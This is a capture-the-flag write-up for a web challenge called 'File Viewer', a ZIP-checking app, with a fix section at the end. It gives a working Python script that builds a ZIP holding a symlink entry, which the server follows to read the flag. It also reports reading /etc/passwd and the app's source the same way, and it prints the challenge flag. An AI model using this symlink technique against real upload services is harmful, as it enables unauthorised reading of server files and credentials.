# File Viewer

**Event:** HICyberCon CTF 2026
**Category:** web
**Flag:** `hiCTF{E45Y_5yml1Nk_0636e6760a}`

---

**Category:** Web · live instance ("Zip Checker") · 83 pts / 98 solves · author `0x0Sayan`

> Credit: this solve follows team Fr4ctur3's public writeup
> (`ushoxa/HI-Cyber-Con-2026-CTF`). The instance was down after the event, so it
> was not re-run here.

## Recon
"File Viewer" is a **Zip Checker**: upload a ZIP, and the app lists the extracted
members, each served back through a generated URL of the form

```
POST /analyze      (multipart/form-data, field `file`)
GET  /<random_token>/<member>
```

Uploading a benign archive and opening `/<token>/hello.txt` returns the member's
contents - the app extracts the archive and serves the members back.

## The bug - ZIP symlink → arbitrary file read
A ZIP entry can be a **symbolic link** rather than a regular file. When the
server extracts the archive and *follows* the link while serving the member, an
attacker can read files outside the extraction directory. Path-traversal
(`../`), command injection and template injection all failed; the symlink entry
succeeded.

## Exploitation
Build an archive whose member is a symlink to the flag:

```python
import zipfile, stat
with zipfile.ZipFile("exploit.zip", "w") as z:
    info = zipfile.ZipInfo("links/flag.txt")
    info.create_system = 3                       # Unix metadata
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    z.writestr(info, "/app/flag.txt")            # symlink target = contents
```

Upload it through `/analyze`, then request the extracted symlink:

```
GET /<upload_token>/links/flag.txt
```

The server follows the link and returns:

```
HTTP 200 OK
Content-Type: text/plain; charset=utf-8

hiCTF{E45Y_5yml1Nk_0636e6760a}
```

Other targets behaved consistently (`/etc/passwd`, `/etc/hostname`,
`/proc/self/cwd/app.py` all returned `200`; `/flag.txt`, `/app/flag` returned
`404`), confirming a general arbitrary-file-read primitive rooted at following
attacker-controlled symlinks.

## Flag
```
hiCTF{E45Y_5yml1Nk_0636e6760a}
```

## Root cause / fix
Extraction into a per-upload directory is not enough if the file-serving endpoint
**follows symlinks** out of it. Reject symlink entries in untrusted archives, or
resolve each served path and verify it stays inside the upload root.
